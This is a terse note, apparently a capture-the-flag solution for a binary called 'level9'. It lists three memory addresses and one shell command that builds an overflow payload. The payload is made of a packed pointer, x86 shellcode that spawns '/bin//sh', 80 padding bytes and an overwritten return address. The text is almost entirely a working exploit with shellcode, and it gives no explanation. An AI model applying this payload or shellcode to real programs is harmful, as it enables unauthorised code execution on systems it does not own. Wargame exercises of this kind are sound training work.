0x804a008
0x0804a00c = adress of string in this
0x0804a010

./level9 $(python -c 
	'import struct; print struct.pack("<I", 0x0804a010) 
		+ "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" 
		+ "A" * 80 + struct.pack("<I", 0x0804a00c)')
